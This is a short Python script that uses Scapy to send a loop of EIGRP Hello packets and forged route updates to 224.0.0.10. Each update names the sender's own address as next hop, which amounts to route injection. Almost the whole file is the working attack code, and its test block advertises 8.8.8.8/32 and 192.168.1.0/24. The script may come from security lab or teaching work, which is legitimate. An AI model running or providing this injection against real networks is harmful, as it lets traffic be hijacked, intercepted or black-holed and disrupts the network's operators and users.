"""
Scapy EIGRP documentation: https://scapy.readthedocs.io/en/latest/api/scapy.contrib.eigrp.html 
"""
from scapy.all import *
from scapy.contrib.eigrp import *
from netaddr import IPNetwork
from time import sleep
from config import MY_IP

def eigrp_inject_routes(*, networks: List[str], asn=1, interval=1):
  """
  Given a list of network addresses specified in CIDR notation,
  flood those networks with EIGRP Hello packets and LSA updates.

  Parameters
  -----------
  networks: List[str]
      List of network addresses in CIDR notation

  interval: number
      Interval in seconds to spam packets
  """

  while True:
    # Send Hello
    sendp(Ether()/IP(src=MY_IP,dst="224.0.0.10")/EIGRP(asn=asn,
      tlvlist=[EIGRPParam(),EIGRPSwVer()]))

    # Send route updates
    for network in networks:
      network = IPNetwork(network)
      ip = str(network.ip)
      prefixlen = network.prefixlen

      # Send route update
      sendp(Ether()/IP(src=MY_IP,dst="224.0.0.10") \
          /EIGRP(opcode="Update", asn=asn, seq=0, ack=0, \
          tlvlist=[EIGRPIntRoute(dst=ip, prefixlen=prefixlen, nexthop=MY_IP)]))

    sleep(interval)


if __name__ == '__main__':
  # FOR TESTING
  TEST_NETWORKS = [
    '8.8.8.8/32',
    '192.168.1.0/24'
  ]
  eigrp_inject_routes(networks=TEST_NETWORKS)